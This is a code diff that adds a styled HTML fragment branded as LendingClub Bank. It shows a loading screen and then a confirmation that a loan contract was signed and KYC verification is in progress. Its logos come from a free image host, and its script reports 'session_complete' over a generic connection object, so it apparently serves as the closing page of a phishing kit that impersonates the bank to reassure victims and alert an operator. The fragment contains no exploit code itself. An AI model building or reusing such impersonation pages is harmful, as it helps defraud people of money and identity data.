@@ -1,0 +1,87 @@
+<style>
+:root{--lc-navy:#113b5e;--text-dark:#2c3e50;--text-light:#565656;--shadow-lg:0 10px 30px rgba(0,0,0,.08);}
+.frag-success{background:#f9f9f9;min-height:100vh;}
+.success-wrapper{margin:0 auto;max-width:600px;background:#fff;overflow:hidden;box-shadow:var(--shadow-lg);}
+.success-topbanner{overflow:hidden;position:relative;}
+.success-topbanner img{width:100%;display:block;}
+.silvie{height:3px;background:linear-gradient(to right,#4570e0,#83a4ff);margin:0;}
+.success-midcontent{padding:6px 4px;text-align:center;background:#fff;}
+.success-midcontent img{width:auto;height:240px;margin-bottom:6px;border-radius:5%;box-shadow:0 10px 25px rgba(0,0,0,.1);border:3px solid rgba(255,255,255,.8);}
+.success-thank{font-family:'Playfair Display',serif;font-size:30px;font-weight:700;color:#2c2c2c;margin-bottom:7px;letter-spacing:.4px;}
+.success-us{font-size:17px;font-weight:400;color:#565656;margin-bottom:18px;}
+.success-splitter{width:68%;height:3px;background:linear-gradient(to right,#4570e0,#83a4ff);margin:18px auto;border-radius:3px;}
+.confirmation-section{padding:14px;background:#f9f9f9;text-align:center;}
+.confirmation-icon{width:58px;height:58px;margin:0 auto 18px;background:#c1c1c1;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 6px 14px rgba(69,112,224,.14);}
+.confirmation-icon svg{width:38px;height:38px;fill:#0048ff;}
+.confirmation-title{font-family:'Playfair Display',serif;font-size:21px;font-weight:600;color:#2c2c2c;margin-bottom:8px;}
+.confirmation-message{font-size:14px;color:#565656;line-height:1.6;max-width:390px;margin:0 auto;}
+.success-footerend{background:#f5f8ff;padding:28px;text-align:center;}
+.success-footerend img{width:110px;margin-bottom:18px;opacity:.9;}
+.success-addr{font-size:12.5px;color:#565656;margin-bottom:16px;line-height:1.6;}
+.success-rights{font-size:12px;color:#888;margin-bottom:10px;line-height:1.6;}
+/* Loader shown before content */
+.success-loader{position:fixed;inset:0;background:linear-gradient(135deg,#1e3c72,#2a5298);display:flex;justify-content:center;align-items:center;z-index:1000;flex-direction:column;}
+.success-loader.hidden{display:none;}
+.sl-ring{position:relative;width:64px;height:64px;}
+.sl-ring::before{content:'';position:absolute;inset:0;border-radius:50%;border:3px solid rgba(255,255,255,.1);border-top:3px solid #fff;animation:sl-spin 1.8s cubic-bezier(.6,.2,.4,.8) infinite;}
+.sl-ring::after{content:'';position:absolute;inset:8px;border-radius:50%;border:2px solid rgba(255,255,255,.05);border-top:2px solid #4570e0;animation:sl-spin 2s cubic-bezier(.6,.2,.4,.8) infinite;}
+@keyframes sl-spin{0%{transform:rotate(0);}100%{transform:rotate(360deg);}}
+.sl-text{margin-top:30px;color:#fff;font-size:19px;font-weight:400;letter-spacing:.5px;opacity:0;animation:sl-fadein 1s ease .5s forwards;}
+.sl-sub{font-size:13px;color:rgba(255,255,255,.7);margin-top:9px;font-weight:300;letter-spacing:.4px;opacity:0;animation:sl-fadein 1s ease 1s forwards;}
+@keyframes sl-fadein{0%{opacity:0;transform:translateY(10px);}100%{opacity:1;transform:translateY(0);}}
+</style>
+
+<!-- Loader (shown for SUCCESS_LOADER ms then hidden) -->
+<div class="success-loader" id="successLoader">
+  <div class="sl-ring"></div>
+  <div class="sl-text">Finalizing Your Account</div>
+  <div class="sl-sub">Please wait while we complete the setup…</div>
+</div>
+
+<!-- Success Content (hidden until loader finishes) -->
+<div class="frag-success" id="successContent" style="display:none;">
+  <div class="success-wrapper">
+    <div class="success-topbanner">
+      <img src="https://i.ibb.co/M5n11vy5/Lending-Club.webp" alt="LendingClub">
+    </div>
+    <div class="silvie"></div>
+    <div class="success-midcontent">
+      <p class="success-thank">Congratulations!</p>
+      <p class="success-us">Your account is ready</p>
+      <img src="https://images.ctfassets.net/orqped9h4wgz/78Ijn41dqqjYyTjJMl87nc/b0876b30a9c54d2908cab2301248fc15/LC_Hero_Image_lg.jpg" alt="Success">
+      <div class="confirmation-section">
+        <div class="confirmation-icon">
+          <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        </div>
+        <h3 class="confirmation-message">
+          Your Loan Contract has been signed successfully.<br>
+          KYC Verification is under progress.<br>
+          You'll be notified shortly once complete.
+        </h3>
+      </div>
+      <div class="success-splitter"></div>
+    </div>
+    <div class="success-footerend">
+      <img src="https://i.ibb.co/DLHxff7/Lending-Club-logo-svg.png" alt="LendingClub">
+      <p class="success-addr">595 Market St, Suite 200<br>San Francisco, CA 94105</p>
+      <p class="success-rights">© 2026 LendingClub Bank. All Rights Reserved.</p>
+      <p class="success-rights">Member FDIC. Equal Housing Lender.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var LOADER_MS = (window.APP_CONFIG && window.APP_CONFIG.TIMING.SUCCESS_LOADER) || 3000;
+  var loader  = document.getElementById('successLoader');
+  var content = document.getElementById('successContent');
+  setTimeout(function(){
+    if(loader)  loader.classList.add('hidden');
+    if(content) content.style.display = 'block';
+    // Mark session complete
+    if(window.SPA && window.SPA.Connection){
+      window.SPA.Connection.send({ type:'session_complete', sessionId: window.SPA.Session.id() });
+    }
+  }, LOADER_MS);
+})();
+</script>
